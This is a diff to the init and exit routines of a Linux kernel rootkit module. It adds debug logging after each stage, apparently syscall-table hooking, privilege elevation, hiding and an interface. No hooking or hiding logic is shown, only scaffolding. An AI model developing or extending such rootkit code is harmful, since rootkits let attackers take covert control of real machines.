@@ -32,24 +32,32 @@ static void __exit rootkit_exit(void) {
 #ifdef DEBUG
   if (retval)
     ROOTKIT_ERROR("elevate_exit() -> %d\n", retval);
+  else
+    ROOTKIT_DEBUG("elevate_exit() -> 0\n");
 #endif
   retval = ghost_exit();
   
 #ifdef DEBUG
   if (retval)
     ROOTKIT_ERROR("ghost_exit() -> %d\n", retval);
+  else
+    ROOTKIT_DEBUG("ghost_exit() -> 0\n");
 #endif
   retval = hide_exit();
 
 #ifdef DEBUG
   if (retval)
     ROOTKIT_ERROR("hide_exit() -> %d\n", retval);
+  else
+    ROOTKIT_DEBUG("hide_exit() -> 0\n");
 #endif
   retval = iface_exit();
   
 #ifdef DEBUG
   if (retval)
     ROOTKIT_ERROR("iface_exit() -> %d\n", retval);
+  else
+    ROOTKIT_DEBUG("iface_exit() -> 0\n");
 #endif
 
   /* remove all remaining hooks */
@@ -59,6 +67,8 @@ static void __exit rootkit_exit(void) {
 #ifdef DEBUG
   if (retval)
     ROOTKIT_ERROR("sctm_cleanup(&rootkit__sctm) -> %d\n", retval);
+  else
+    ROOTKIT_DEBUG("sctm_cleanup(&rootkit__sctm) -> 0\n");
 #endif
 }
 
@@ -77,6 +87,9 @@ static int __init rootkit_init(void) {
 #endif
     return retval;
   }
+#ifdef DEBUG
+  ROOTKIT_DEBUG("sctm_init(&rootkit__sctm) -> 0\n");
+#endif
   retval = elevate_init(&rootkit__sctm);
 
   if (retval) {
@@ -85,6 +98,9 @@ static int __init rootkit_init(void) {
 #endif
     return retval;
   }
+#ifdef DEBUG
+  ROOTKIT_DEBUG("elevate_init(&rootkit__sctm) -> 0\n");
+#endif
   retval = ghost_init(&rootkit__sctm);
   
   if (retval) {
@@ -93,6 +109,9 @@ static int __init rootkit_init(void) {
 #endif
     return retval;
   }
+#ifdef DEBUG
+  ROOTKIT_DEBUG("ghost_init(&rootkit__sctm) -> 0\n");
+#endif
   retval = hide_init(&rootkit__sctm);
 
   if (retval) {
@@ -101,11 +120,16 @@ static int __init rootkit_init(void) {
 #endif
     return retval;
   }
+#ifdef DEBUG
+  ROOTKIT_DEBUG("hide_init(&rootkit__sctm) -> 0\n");
+#endif
   retval = iface_init(&rootkit__sctm);
   
 #ifdef DEBUG
   if (retval)
     ROOTKIT_ERROR("iface_init(&rootkit__sctm) -> %d\n", retval);
+  else
+    ROOTKIT_DEBUG("iface_init(&rootkit__sctm) -> 0\n");
 #endif
   return retval;
 }
